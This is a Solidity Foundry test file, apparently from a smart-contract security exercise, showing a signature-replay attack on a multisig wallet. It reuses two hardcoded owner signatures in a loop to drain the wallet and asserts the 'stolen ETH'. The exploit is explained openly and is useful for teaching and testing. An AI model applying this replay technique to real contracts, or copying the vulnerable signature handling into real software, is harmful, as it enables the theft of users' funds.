// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../../src/10. Replay Attack-1/MultiSignatureWallet.sol";
//import "../../src/10. Replay Attack-1/MultiSignatureWalletSecured.sol";
import "../../src/10. Replay Attack-1/Signature.sol";

contract TestMultiSignatureWallet is Test {
    MultiSignatureWallet multiSigWallet;

    address deployer;
    uint256 deployerKey;
    address signer2;
    uint256 signer2Key;
    address attacker = makeAddr("attacker");

    uint256 constant ETH_IN_MULTISIG = 100 ether;
    uint256 constant ATTACKER_WITHDRAW = 1 ether;

    function setUp() public {
        (deployer, deployerKey) = makeAddrAndKey("deployer");
        (signer2, signer2Key) = makeAddrAndKey("signer2");

        // Deploy multi sig
        vm.deal(deployer, ETH_IN_MULTISIG);
        vm.startPrank(deployer);

        multiSigWallet = new MultiSignatureWallet([deployer, signer2]);

        // Send ETH to multisig Wallet
        payable(address(multiSigWallet)).transfer(ETH_IN_MULTISIG);
        assertEq(address(multiSigWallet).balance, ETH_IN_MULTISIG);

        // Prepare withdraw Message
        bytes32 message = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n52", attacker, ATTACKER_WITHDRAW));

        // Sign message
        (uint8 v1, bytes32 r1, bytes32 s1) = vm.sign(deployerKey, message);
        (uint8 v2, bytes32 r2, bytes32 s2) = vm.sign(signer2Key, message);

        Signature[2] memory signatures = [Signature(v1, r1, s1), Signature(v2, r2, s2)];

        console.log("signature1: ");
        console.log("v: ", signatures[0].v);
        console.logBytes32(signatures[0].r);
        console.logBytes32(signatures[0].s);
        console.log("signature2: ");
        console.log("v: ", signatures[1].v);
        console.logBytes32(signatures[1].r);
        console.logBytes32(signatures[1].s);

        // Call transfer with signatures
        multiSigWallet.transfer(attacker, ATTACKER_WITHDRAW, signatures);

        assertEq(address(multiSigWallet).balance, ETH_IN_MULTISIG - ATTACKER_WITHDRAW);
    }

    function testWallet() public {
        vm.startPrank(attacker);
        uint256 currentMultisigBalance = address(multiSigWallet).balance;
        Signature[2] memory signatures = [
            Signature(
                27,
                0x1ddabf42460a80d2780a214aeec06787c1feb8046f4a88662db254e1ea1c15db,
                0x1ddb0931fa6572af9ea5bab4c7afd0779a095beb68a9ca160c8b23647d63f7f9
            ),
            Signature(
                27,
                0xada7024b0ac3b997b1d05eedf4ba6020f1fdc92eaae47c2e9c6ec354ec86b075,
                0x541172db522d0cc2ef6c651c8ef67b9f8fb858b394e239d8d1507e58356f787c
            )
        ];

        for (uint8 i = 0; i < currentMultisigBalance / 1 ether; i++) {
            // Note: Initial message was signed with 1 ether and this is why we can't
            // change the value here to do the attack in one call
            multiSigWallet.transfer(attacker, ATTACKER_WITHDRAW, signatures);
        }

        //MultiSig Wallet is empty
        assertEq(address(multiSigWallet).balance, 0);

        // Attacker is supposed to own the stolen ETH ( +99 ETH , -0.1 ETH for gas)
        assertGt(attacker.balance, 99 ether, "Mission fail, not enough ETH stolen");
    }
}
